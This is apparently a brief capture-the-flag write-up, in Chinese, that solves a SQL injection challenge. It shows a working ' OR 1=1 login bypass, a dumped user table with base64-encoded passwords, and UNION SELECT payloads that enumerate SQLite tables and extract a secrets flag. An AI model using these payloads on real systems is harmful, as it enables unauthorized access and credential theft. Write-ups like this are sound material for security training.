輸入一串甚麼 `' OR 1=1 -- ` 就會噴出一堆 base64 密碼

```
username	password	role
CYSun	VlF+cDhtPVVLc0JjIW9aKmNNIXZiZUR5V3JeaEE+ODJNNHNYVWNyK0V5Uilh	PROFESSOR
Paul	aGVsbG9ASWFtUEFVTDEyMw==	STUDENT
YPP	b3V0aG91c2Utc3Bpbm5pbmctYWxleGlzPT0=	STUDENT
younglee	c3VwZXJzZWN1cmV0c2VjcmV0c2VjcmV0	STUDENT
Win	aWFtd2luMjAyNA==	STUDENT
Adb2	MTIwNDEyMDQ=	STUDENT
WIFI	c3VjY2Vzc2Z1bGx5X2xlYWtlZF9zZWNyZXRfZGF0YQ==	STUDENT
robert	Z2lQOWNOTlk=	STUDENT
pudding483	cHVkZGluZzQ4Mw==	GUEST
```

然後冒充教授登入(?) 就能開始撈資料庫

```
' UNION SELECT name,NULL,NULL FROM sqlite_master WHERE type='table'; --
' UNION SELECT (SELECT sql FROM sqlite_master WHERE type='table' AND name='secrets'),NULL,NULL ; --
secrets

' UNION SELECT ID,flag,NULL from secrets; --
```
